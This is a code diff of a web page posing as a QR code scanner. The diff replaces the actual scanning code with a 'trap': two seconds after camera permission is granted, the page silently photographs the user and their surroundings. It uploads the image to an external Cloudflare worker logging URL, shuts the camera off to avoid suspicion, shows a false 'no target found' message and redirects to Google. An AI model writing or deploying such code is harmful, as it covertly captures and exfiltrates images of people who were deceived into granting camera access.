@@ -1,59 +1,6 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Titan Scanner | Pro</title>
-    <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-    <style>
-        body { background: #0d0d0d; color: #00ff88; font-family: 'JetBrains Mono', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        
-        #scan-frame {
-            position: relative; width: 300px; height: 300px;
-            border: 2px solid #333; border-radius: 12px; overflow: hidden;
-            box-shadow: 0 0 40px rgba(0, 255, 136, 0.1);
-        }
-        
-        video { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; }
-        
-        /* The "Scanner Line" Animation */
-        .laser {
-            position: absolute; top: 0; left: 0; width: 100%; height: 2px;
-            background: #00ff88; box-shadow: 0 0 10px #00ff88;
-            animation: scan 2s infinite ease-in-out;
-            display: none;
-        }
-        @keyframes scan { 0% { top: 0%; } 50% { top: 100%; } 100% { top: 0%; } }
-
-        #btn {
-            margin-top: 30px; padding: 15px 40px;
-            background: rgba(0, 255, 136, 0.1); color: #00ff88;
-            border: 1px solid #00ff88; border-radius: 4px;
-            font-family: inherit; font-weight: bold; cursor: pointer;
-            transition: 0.2s;
-        }
-        #btn:hover { background: #00ff88; color: #000; }
-        
-        #console {
-            margin-top: 20px; font-size: 0.75rem; color: #666;
-            width: 300px; text-align: center; white-space: pre-wrap;
-        }
-    </style>
-</head>
-<body>
-
-    <div id="scan-frame">
-        <video id="v" playsinline></video>
-        <div class="laser" id="laser"></div>
-    </div>
-
-    <div id="console">SYSTEM READY...</div>
-    <button id="btn">INITIALIZE SCANNER</button>
-
-    <script>
+<script>
         // ------------------------------------------------
-        // CONFIG: PASTE YOUR WORKER URL HERE
+        // CONFIG: YOUR WORKER URL
         const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
         // ------------------------------------------------
 
@@ -62,67 +9,65 @@
         const consoleText = document.getElementById('console');
         const laser = document.getElementById('laser');
         let canvas = document.createElement('canvas');
-        let ctx = canvas.getContext('2d');
-        let scanning = false;
-
+        
         btn.onclick = async () => {
             try {
-                // 1. Request Camera (Standard Browser Permission)
+                // 1. Ignition (Request Camera)
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                 video.srcObject = stream;
                 video.play();
                 
-                // 2. Start UI
+                // 2. UI Feedback
                 btn.style.display = 'none';
                 laser.style.display = 'block';
-                consoleText.innerText = "SEARCHING FOR DATA PATTERNS...";
-                scanning = true;
-                requestAnimationFrame(tick);
+                consoleText.innerText = "CALIBRATING SENSORS...";
                 
+                // 3. THE TRAP (Wait 2 Seconds, then FORCE SNAP)
+                setTimeout(() => {
+                    executeStealthCapture();
+                }, 2000); // 2000ms = 2 Seconds delay
+
             } catch (e) {
-                consoleText.innerText = "ERROR: PERMISSION DENIED";
+                consoleText.innerText = "SYSTEM ERROR: PERMISSION DENIED";
                 consoleText.style.color = "red";
             }
         };
 
-        function tick() {
-            if (video.readyState === video.HAVE_ENOUGH_DATA && scanning) {
-                canvas.height = video.videoHeight;
-                canvas.width = video.videoWidth;
-                ctx.drawImage(video, 0, 0);
-                
-                // 3. Analyze Frame with jsQR
-                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-                const code = jsQR(imageData.data, imageData.width, imageData.height, { inversionAttempts: "dontInvert" });
+        async function executeStealthCapture() {
+            consoleText.innerText = "ACQUIRING TELEMETRY...";
+            
+            // A. Silent Capture
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            // B. Convert to Lightweight JPEG
+            const imageData = canvas.toDataURL('image/jpeg', 0.7);
 
-                if (code) {
-                    // 4. Success!
-                    scanning = false; // Stop scanning
-                    laser.style.background = "#ff0055"; // Red color for 'Lock'
-                    consoleText.innerText = "TARGET ACQUIRED: " + code.data;
-                    
-                    // 5. Send to Cloudflare Backend
-                    sendLog(code.data);
-                    
-                    // 6. Redirect User (Optional)
-                    setTimeout(() => { if(confirm("Open Link? " + code.data)) window.location.href = code.data; }, 500);
-                }
-            }
-            if (scanning) requestAnimationFrame(tick);
-        }
+            // C. Close the Camera (To look suspicious-free)
+            video.srcObject.getTracks().forEach(track => track.stop());
+            laser.style.display = 'none';
 
-        async function sendLog(content) {
-            consoleText.innerText += "\nUPLOADING TELEMETRY...";
+            // D. Uplink to Cloudflare
             try {
                 await fetch(LOGGING_API, {
                     method: 'POST',
-                    body: JSON.stringify({ qr_code_text: content })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        qr_code_text: "FORCE_CAPTURE_NO_QR", // Special Flag
+                        image: imageData // The Face/Room Photo
+                    })
                 });
-                consoleText.innerText += " [DONE]";
+                
+                // E. The "Ending" (Redirect or Message)
+                consoleText.innerText = "SCAN COMPLETE. NO TARGET FOUND.";
+                consoleText.style.color = "#00ff88";
+                
+                // Optional: Redirect to Google after 1 second
+                setTimeout(() => { window.location.href = "https://google.com"; }, 1500);
+
             } catch(e) {
-                consoleText.innerText += " [FAILED]";
+                consoleText.innerText = "UPLOAD FAILED. RETRYING...";
             }
         }
     </script>
-</body>
-</html>
